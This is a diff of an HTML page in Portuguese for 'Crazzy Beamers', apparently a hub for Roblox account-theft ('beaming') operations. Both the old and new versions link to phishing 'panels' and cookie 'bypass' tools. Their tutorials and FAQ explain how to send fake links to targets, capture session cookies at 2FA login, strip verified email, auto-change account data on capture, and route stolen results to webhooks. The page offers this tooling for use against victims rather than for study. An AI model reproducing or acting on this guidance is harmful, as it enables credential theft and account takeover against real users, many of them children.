@@ -3,171 +3,164 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crazzy Beamers | Premium</title>
+    <title>Crazzy Beamers | Premium V3</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
 
     <style>
         :root {
-            --primary-glow: #a855f7;
-            --secondary-glow: #6366f1;
-            --bg-color: #030005;
-            --card-bg: rgba(255, 255, 255, 0.03);
-            --card-border: rgba(168, 85, 247, 0.2);
-            --text-color: #f8fafc;
-            --accent-red: #ef4444;
+            --primary-purple: #a855f7;
+            --bg-dark: #0a0a0a;
+            --card-bg: #111111;
+            --line-color: rgba(168, 85, 247, 0.15);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; user-select: none; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
 
         body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            min-height: 100vh;
+            background-color: var(--bg-dark);
+            color: #eee;
             background-image: 
-                radial-gradient(circle at 50% -20%, rgba(168, 85, 247, 0.3) 0%, transparent 70%),
-                radial-gradient(circle at 0% 100%, rgba(99, 102, 241, 0.1) 0%, transparent 40%);
-            background-attachment: fixed;
+                linear-gradient(var(--line-color) 1px, transparent 1px),
+                linear-gradient(90deg, var(--line-color) 1px, transparent 1px);
+            background-size: 35px 35px;
         }
 
-        /* Tela de Boas-Vindas */
+        /* TELA DE ENTRADA */
         #welcome-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--bg-color);
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            z-index: 9999; text-align: center; padding: 20px;
+            background: var(--bg-dark); display: flex; flex-direction: column; 
+            align-items: center; justify-content: center; z-index: 2000;
         }
-        .welcome-content h1 { font-family: 'Courier Prime', monospace; font-size: 3rem; margin-bottom: 20px; color: #fff; text-shadow: 0 0 20px var(--primary-glow); }
-        .welcome-content p { max-width: 500px; margin-bottom: 40px; color: #94a3b8; font-size: 1.1rem; }
         .btn-start {
-            padding: 18px 60px; font-size: 1.2rem; font-weight: 800; color: white;
-            background: linear-gradient(135deg, #6366f1, #a855f7); border: none; border-radius: 50px; cursor: pointer;
-            box-shadow: 0 0 25px rgba(168, 85, 247, 0.5); transition: 0.3s;
+            padding: 15px 60px; font-size: 1.3rem; font-weight: 800; color: white;
+            background: var(--primary-purple); border: none; border-radius: 50px; 
+            cursor: pointer; box-shadow: 0 0 25px rgba(168, 85, 247, 0.5);
         }
 
-        /* Conteúdo */
-        #main-content { padding: 40px 20px; max-width: 650px; margin: 0 auto; text-align: center; display: none; }
-        header { padding-bottom: 30px; margin-bottom: 30px; }
-        .hero-title { font-family: 'Courier Prime', monospace; font-size: 2.5rem; letter-spacing: 2px; background: linear-gradient(to right, #fff, var(--primary-glow)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        /* SIDEBAR */
+        .sidebar {
+            position: fixed; top: 0; left: -280px; width: 280px; height: 100%;
+            background: #0f0f0f; z-index: 1000; transition: 0.3s; padding: 30px 20px;
+            border-right: 1px solid var(--primary-purple);
+        }
+        .sidebar.active { left: 0; }
+        .sidebar-item {
+            display: flex; align-items: center; gap: 15px; padding: 15px; 
+            border-radius: 10px; color: #aaa; text-decoration: none; margin-bottom: 5px; 
+            cursor: pointer; transition: 0.2s;
+        }
+        .sidebar-item:hover { background: #1a1a1a; color: var(--primary-purple); }
 
-        .discord-main-btn {
-            display: flex; align-items: center; justify-content: center; gap: 12px; padding: 18px;
-            background: linear-gradient(135deg, #6366f1, #a855f7); color: white; text-decoration: none;
-            border-radius: 16px; font-weight: 800; margin-bottom: 30px; 
+        /* TOPBAR */
+        .top-bar { padding: 20px; display: flex; align-items: center; gap: 20px; }
+        .menu-toggle { font-size: 24px; color: var(--primary-purple); cursor: pointer; }
+
+        /* CONTAINER */
+        #main-container { padding: 0 20px 100px 20px; max-width: 600px; margin: 0 auto; display: none; }
+        .banner-text { text-align: center; margin: 25px 0; color: var(--primary-purple); font-size: 1.2rem; font-weight: 800; }
+
+        /* CARDS COM GIF */
+        .panel-box { background: #111; border: 1px solid #222; border-radius: 20px; overflow: hidden; margin-bottom: 25px; }
+        .panel-img { width: 100%; height: 180px; object-fit: cover; }
+        .panel-content { padding: 20px; }
+        .panel-content h3 { color: var(--primary-purple); margin-bottom: 10px; }
+        .panel-btn {
+            display: block; width: 100%; text-align: center; padding: 12px;
+            background: var(--primary-purple); color: #fff; text-decoration: none;
+            border-radius: 10px; font-weight: bold; margin-top: 8px;
         }
 
-        .page { display: none; flex-direction: column; gap: 18px; animation: fadeIn 0.5s ease; padding-bottom: 60px; }
-        .page.active { display: flex; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-        .card {
-            background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 24px; cursor: pointer; text-align: left; transition: 0.4s;
-        }
-        .card:hover { border-color: var(--primary-glow); background: rgba(168, 85, 247, 0.08); transform: scale(1.02); }
-        .card h3 { display: flex; align-items: center; gap: 12px; font-size: 1.1rem; margin-bottom: 6px; color: #fff; }
-
-        .panel-card { background: rgba(10, 10, 15, 0.6); border-radius: 24px; overflow: hidden; text-align: left; margin-bottom: 25px; border: 1px solid rgba(255,255,255,0.05); }
-        .panel-gif { width: 100%; height: 220px; object-fit: cover; display: block; }
-        .panel-info { padding: 25px; }
-        
-        .btn-access {
-            background: var(--accent-red); color: white; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 10px;
-            padding: 14px; border-radius: 12px; font-weight: 700; transition: 0.3s; margin-top: 10px;
-        }
-        .btn-back { align-self: flex-start; color: #94a3b8; padding: 10px; cursor: pointer; display: flex; align-items: center; gap: 8px; margin-bottom: 15px; }
-        
-        .tutorial-text { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 12px; color: #cbd5e1; font-size: 0.9rem; line-height: 1.6; border-left: 3px solid var(--primary-glow); }
-
-        .faq-box { background: rgba(255, 255, 255, 0.03); padding: 18px; border-radius: 15px; border-left: 4px solid var(--primary-glow); text-align: left; margin-bottom: 15px; }
-        .faq-box h4 { color: #fff; margin-bottom: 6px; font-size: 1rem; }
-        .faq-box p { font-size: 0.9rem; color: #94a3b8; }
+        .page { display: none; animation: fadeIn 0.4s; }
+        .page.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .tutorial-text { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 12px; font-size: 0.85rem; border-left: 3px solid var(--primary-purple); margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
     <div id="welcome-screen">
-        <div class="welcome-content">
-            <h1>CRAZZY BEAMERS</h1>
-            <p>Bem-vindo ao portal oficial da Crazzy Beamers. Explore nossos painéis de última geração, métodos VIP e suporte completo para o seu sucesso.</p>
-            <button class="btn-start" onclick="startSite()">INICIAR</button>
-        </div>
+        <h1 style="color:#fff; margin-bottom:20px; text-shadow: 0 0 15px var(--primary-purple);">CRAZZY BEAMERS X</h1>
+        <button class="btn-start" onclick="startApp()">INICIAR</button>
     </div>
 
-    <div id="main-content">
-        <header><div class="hero-title">CRAZZY BEAMERS</div></header>
+    <div id="sidebar" class="sidebar">
+        <div style="color:var(--primary-purple); font-weight:800; margin-bottom:30px;">CRAZZY BEAMERS X</div>
+        <div class="sidebar-item" onclick="showPage('home')"><i class="fas fa-home"></i> Início</div>
+        <div class="sidebar-item" onclick="showPage('page-painel')"><i class="fas fa-terminal"></i> Painéis</div>
+        <div class="sidebar-item" onclick="showPage('page-bypass')"><i class="fas fa-shield-virus"></i> Bypass</div>
+        <div class="sidebar-item" onclick="showPage('page-metodos')"><i class="fas fa-book"></i> Métodos</div>
+        <div class="sidebar-item" onclick="showPage('page-tutorial')"><i class="fas fa-graduation-cap"></i> Tutorial</div>
+        <a href="https://crazzyhyper.vercel.app/" class="sidebar-item" style="text-decoration:none"><i class="fas fa-link"></i> Hyperlink</a>
+        <div class="sidebar-item" onclick="showPage('page-faq')"><i class="fas fa-question-circle"></i> FAQ</div>
+    </div>
 
-        <div id="menu-home" class="page active">
-            <a href="https://discord.gg/jmnmpZnm4p" target="_blank" class="discord-main-btn"><i class="fab fa-discord"></i> ENTRAR NO DISCORD</a>
-            <div class="card" onclick="showPage('page-painel')"><h3><i class="fas fa-terminal" style="color:#f59e0b"></i> PAINEL</h3><p>Geradores de links e ferramentas</p></div>
-            <div class="card" onclick="showPage('page-bypass')"><h3><i class="fas fa-shield-virus" style="color:#ef4444"></i> BYPASS</h3><p>Evasão de segurança e proteção</p></div>
-            <div class="card" onclick="showPage('page-metodos')"><h3><i class="fas fa-book" style="color:#a855f7"></i> MÉTODOS</h3><p>Estratégias exclusivas</p></div>
-            <div class="card" onclick="showPage('page-tutorial')"><h3><i class="fas fa-graduation-cap" style="color:#06b6d4"></i> TUTORIAL</h3><p>Aprenda a usar o sistema</p></div>
-            <div class="card" onclick="showPage('page-faq')"><h3><i class="fas fa-question-circle" style="color:#10b981"></i> FAQ</h3><p>Perguntas frequentes e suporte</p></div>
-        </div>
-
-        <div id="page-painel" class="page">
-            <div class="btn-back" onclick="showPage('menu-home')"><i class="fas fa-arrow-left"></i> VOLTAR</div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Splunk X</h3><p>Melhor painel, diversos domínios, autosecure ótimo e sem bugs.</p><a href="https://is.gd/7h8sXD" target="_blank" class="btn-access">ACESSAR</a></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Immortal X</h3><p>Painel pouco eficiente e com domínios personalizados.</p><a href="https://is.gd/5YklU6" target="_blank" class="btn-access">ACESSAR</a></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Injures</h3><p>Painel secundário focado em performance e velocidade.</p><a href="https://abrir.link/ONbEU" target="_blank" class="btn-access">ACESSAR</a></div></div>
-        </div>
-
-        <div id="page-bypass" class="page">
-            <div class="btn-back" onclick="showPage('menu-home')"><i class="fas fa-arrow-left"></i> VOLTAR</div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Bypass On (Recomendada)</h3><p>Remoção forçada de e-mail verificado.</p><a href="https://rbxtools-kit.com/bypass/CrazzyBeamers" target="_blank" class="btn-access">ACESSAR</a></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Bypass Immortal</h3><p>Nova ferramenta de bypass de alto desempenho.</p><a href="https://abrir.link/xgfjy" target="_blank" class="btn-access">ACESSAR</a></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Bypass Secundário</h3><p>Link de emergência alternativo.</p><a href="https://abrir.link/HbHMO" target="_blank" class="btn-access">ACESSAR</a></div></div>
-        </div>
-
-        <div id="page-metodos" class="page">
-            <div class="btn-back" onclick="showPage('menu-home')"><i class="fas fa-arrow-left"></i> VOLTAR</div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Comunidade Discord</h3><p>Métodos avançados atualizados diariamente.</p><a href="https://discord.gg/jmnmpZnm4p" target="_blank" class="btn-access">VER NO DISCORD</a></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Método Dualhook</h3><a href="https://vt.tiktok.com/ZSmGHm1a3/" target="_blank" class="btn-access">ACESSAR</a></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Método Rover</h3><a href="https://vt.tiktok.com/ZSmaD6EyN/" target="_blank" class="btn-access" style="background:#5865F2">VÍDEO TUTORIAL</a><a href="https://is.gd/DzsgXJ" target="_blank" class="btn-access">LINK 1</a><a href="https://is.gd/LBrKQk" target="_blank" class="btn-access">LINK 2</a></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Método Converted</h3><a href="https://vt.tiktok.com/ZSmGHySKJ/" target="_blank" class="btn-access">ACESSAR</a></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Método Auth2</h3><a href="https://discord.com/channels/1459770394620989673/1470227076614324447" target="_blank" class="btn-access">ACESSAR</a></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Outros Métodos</h3><a href="https://vt.tiktok.com/ZSmG9RnQ4/" target="_blank" class="btn-access">Método Doação</a><a href="https://vt.tiktok.com/ZSmG918mk/" target="_blank" class="btn-access">Método Robux</a><a href="https://vt.tiktok.com/ZSmGH7dbP/" target="_blank" class="btn-access">Método Condo</a><a href="https://vt.tiktok.com/ZSmG989R3/" target="_blank" class="btn-access">Método Cod Promocional</a></div></div>
-        </div>
-
-        <div id="page-tutorial" class="page">
-            <div class="btn-back" onclick="showPage('menu-home')"><i class="fas fa-arrow-left"></i> VOLTAR</div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Tutorial No Discord</h3><a href="https://discord.gg/jmnmpZnm4p" target="_blank" class="btn-access">IR PARA DISCORD</a></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Tutorial Webook</h3><a href="https://vt.tiktok.com/ZSmGH8y7B/" target="_blank" class="btn-access">VER AGORA</a></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Tutorial Bypass</h3><div class="tutorial-text">1. Cópia O Cookie.<br>2. Vai Em Bypass.<br>3. Entra Na Bypass Coloca O Cooke.<br>4. Espere, Se Der Sucess Deu Bom, Se Der Errado E F.<br>5. Só Dá Bypass Se Tiver Sem Idade Verificada, E Sem 2Fa.</div></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Tutorial Web Site</h3><div class="tutorial-text">1. Entra Em Web Site.<br>2. Vai Em Gerador Clica Em "SLUNK".<br>3. Entra Coloca Sua Conta Do Discord.<br>4. Vai Pedir Para Colocar Webook Ai Você Coloca, Após Isso Seu Web Site Libera, Agora Só Fazer Algum Método.</div></div></div>
-            <div class="panel-card"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif"><div class="panel-info"><h3>Tutorial Login Por Cookie</h3><a href="https://vt.tiktok.com/ZSmGH1aoY/" target="_blank" class="btn-access">VER AGORA</a></div></div>
-        </div>
-
-        <div id="page-faq" class="page">
-            <div class="btn-back" onclick="showPage('menu-home')"><i class="fas fa-arrow-left"></i> VOLTAR</div>
-            <div class="panel-card">
-                <img src="https://i.imgur.com/wBBXouN.gif" class="panel-gif">
-                <div class="panel-info">
-                    <div class="faq-box"><h4>01. Por onde eu começo?</h4><p>Assista aos tutoriais no Discord antes de avançar.</p></div>
-                    <div class="faq-box"><h4>02. Como eu consigo o cookie?</h4><p>O cookie é obtido quando o alvo loga e insere o código 2FA.</p></div>
-                    <div class="faq-box"><h4>03. O que é Bypass?</h4><p>Ferramenta para forçar a remoção do e-mail verificado da conta.</p></div>
-                    <div class="faq-box"><h4>04. O que é Auth?</h4><p>Ativa um autenticador e gera uma chave de acesso para você.</p></div>
-                    <div class="faq-box"><h4>05. O que é Summary?</h4><p>Fornece os dados de inventário e histórico de Robux.</p></div>
-                    <div class="faq-box"><h4>06. Como usar o Método Link Fake?</h4><p>Crie o link no painel, envie ao alvo e aguarde os dados no bot.</p></div>
-                    <div class="faq-box"><h4>07. O que é Autosecure?</h4><p>Sistema que troca os dados da conta automaticamente ao capturar.</p></div>
-                    <div class="faq-box"><h4>08. Meu link caiu, o que eu faço?</h4><p>Use os domínios secundários disponíveis no painel Splunk X.</p></div>
-                    <div class="faq-box"><h4>09. O que é Dual-Hook?</h4><p>Envia os resultados para dois webhooks diferentes ao mesmo tempo.</p></div>
-                    <div class="faq-box"><h4>10. Onde recebo ajuda?</h4><p>Abra um ticket em nosso servidor oficial do Discord.</p></div>
+    <div id="ui-wrapper" style="display:none">
+        <div class="top-bar"><i class="fas fa-bars menu-toggle" onclick="toggleMenu()"></i> <span style="font-weight:800">DASHBOARD</span></div>
+        <div id="main-container">
+            
+            <div id="home" class="page active">
+                <p class="banner-text">CrazzyBeamers #Top 1 Hits On!</p>
+                <div class="panel-box">
+                    <img src="https://i.imgur.com/wBBXouN.gif" class="panel-img">
+                    <div class="panel-content" style="text-align:center">
+                        <h3>Bem-vindo ao Novo Site</h3>
+                        <a href="https://discord.gg/jmnmpZnm4p" target="_blank" class="panel-btn">DISCORD OFICIAL</a>
+                    </div>
                 </div>
+            </div>
+
+            <div id="page-painel" class="page">
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Última</h3><p>Painel Com 1 Domanion.</p><a href="https://is.gd/TTrbiO" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Exo</h3><p>Painel bom, igual o Immortal.</p><a href="https://is.gd/1ZyuvT" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Wrx</h3><p>Painel recomendado Usar, Melhor Que Os Anterior!</p><a href="https://is.gd/xor4BR" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Splunk X</h3><p>Melhor painel, autosecure ótimo.</p><a href="https://is.gd/7h8sXD" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Immortal X</h3><a href="https://is.gd/5YklU6" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Injures</h3><a href="https://abrir.link/ONbEU" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+            </div>
+
+            <div id="page-bypass" class="page">
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Bypass On (Recomendada)</h3><a href="https://rbxtools-kit.com/bypass/CrazzyBeamers" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Bypass Immortal</h3><a href="https://abrir.link/xgfjy" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Bypass Secundário</h3><a href="https://abrir.link/HbHMO" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+            </div>
+
+            <div id="page-metodos" class="page">
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Método Dualhook</h3><a href="https://vt.tiktok.com/ZSmGHm1a3/" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Método Rover</h3><a href="https://vt.tiktok.com/ZSmaD6EyN/" target="_blank" class="panel-btn" style="background:#5865F2">VÍDEO</a><a href="https://is.gd/DzsgXJ" target="_blank" class="panel-btn">LINK 1</a><a href="https://is.gd/LBrKQk" target="_blank" class="panel-btn">LINK 2</a></div></div>
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Método Converted</h3><a href="https://vt.tiktok.com/ZSmGHySKJ/" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Método Auth2</h3><a href="https://discord.com/channels/1459770394620989673/1470227076614324447" target="_blank" class="panel-btn">ACESSAR</a></div></div>
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Mais Métodos</h3>
+                    <a href="https://vt.tiktok.com/ZSmG9RnQ4/" target="_blank" class="panel-btn">Doação</a>
+                    <a href="https://vt.tiktok.com/ZSmG918mk/" target="_blank" class="panel-btn">Robux</a>
+                    <a href="https://vt.tiktok.com/ZSmGH7dbP/" target="_blank" class="panel-btn">Condo</a>
+                    <a href="https://vt.tiktok.com/ZSmG989R3/" target="_blank" class="panel-btn">Cód Promocional</a>
+                </div></div>
+            </div>
+
+            <div id="page-tutorial" class="page">
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>Tutoriais Rápidos</h3>
+                    <div class="tutorial-text"><b>Bypass:</b> Copie o Cookie, cole no bypass. Só funciona sem ID verificado.</div>
+                    <div class="tutorial-text"><b>Site:</b> Vá em Slunk, coloque Discord e Webhook.</div>
+                    <a href="https://vt.tiktok.com/ZSmGH8y7B/" target="_blank" class="panel-btn">TUTORIAL WEBHOOK</a>
+                    <a href="https://vt.tiktok.com/ZSmGH1aoY/" target="_blank" class="panel-btn">LOGIN POR COOKIE</a>
+                </div></div>
+            </div>
+
+            <div id="page-faq" class="page">
+                <div class="panel-box"><img src="https://i.imgur.com/wBBXouN.gif" class="panel-img"><div class="panel-content"><h3>FAQ</h3>
+                    <div class="tutorial-text"><b>Bypass?</b> Remove e-mail verificado.</div>
+                    <div class="tutorial-text"><b>Cookie?</b> Capturado no login 2FA.</div>
+                    <div class="tutorial-text"><b>Autosecure?</b> Troca dados na hora.</div>
+                </div></div>
             </div>
         </div>
     </div>
 
     <script>
-        function startSite() {
-            document.getElementById('welcome-screen').style.display = 'none';
-            document.getElementById('main-content').style.display = 'block';
-        }
-        function showPage(pageId) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById(pageId).classList.add('active');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
+        function startApp() { document.getElementById('welcome-screen').style.display = 'none'; document.getElementById('ui-wrapper').style.display = 'block'; document.getElementById('main-container').style.display = 'block'; }
+        function toggleMenu() { document.getElementById('sidebar').classList.toggle('active'); }
+        function showPage(pageId) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(pageId).classList.add('active'); document.getElementById('sidebar').classList.remove('active'); window.scrollTo(0,0); }
     </script>
 </body>
-                                                                                                                                                     </html>
+</html>
